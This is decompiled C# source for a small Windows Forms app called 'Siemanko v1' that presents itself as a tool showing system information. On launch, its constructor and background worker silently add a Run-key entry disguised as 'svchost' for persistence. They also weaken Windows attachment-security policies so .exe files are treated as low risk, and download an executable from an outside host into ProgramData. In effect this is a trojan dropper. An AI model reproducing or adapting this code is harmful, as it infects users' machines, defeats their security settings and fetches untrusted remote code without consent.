using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Siemanko;

public class Form1 : Form
{
	private IContainer components = null;

	private Button button1;

	private Label label1;

	private Label label2;

	private PictureBox pictureBox1;

	private Label label3;

	private BackgroundWorker backgroundWorker1;

	public Form1()
	{
		InitializeComponent();
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("svchost", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\svchost.exe");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments");
		registryKey2.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations");
		registryKey3.SetValue("LowRiskFileTypes", ".exe");
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe"))
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe");
		}
		WebClient webClient = new WebClient();
		webClient.DownloadFile("http://jach.me/lab/roj/svchost.exe", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Control)label1).set_Text(Environment.MachineName);
		((Control)label2).set_Text(Environment.GetFolderPath(Environment.SpecialFolder.System));
		((Control)label3).set_Text(Environment.Version.ToString());
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue("svchost", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\svchost.exe");
		RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments");
		registryKey2.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations");
		registryKey3.SetValue("LowRiskFileTypes", ".exe");
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe"))
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe");
		}
		WebClient webClient = new WebClient();
		webClient.DownloadFile("http://jach.me/lab/roj/svchost.exe", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "/svchost.exe");
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		while (backgroundWorker1.IsBusy)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_01ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Expected O, but got Unknown
		//IL_033a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0344: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		pictureBox1 = new PictureBox();
		label3 = new Label();
		backgroundWorker1 = new BackgroundWorker();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_Location(new Point(12, 115));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(450, 35));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("CLICK!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(22, 32));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(0, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(22, 50));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(0, 13));
		((Control)label2).set_TabIndex(2);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(173, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(289, 97));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(3);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(22, 75));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(0, 13));
		((Control)label3).set_TabIndex(4);
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(467, 162));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Siemanko v1");
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
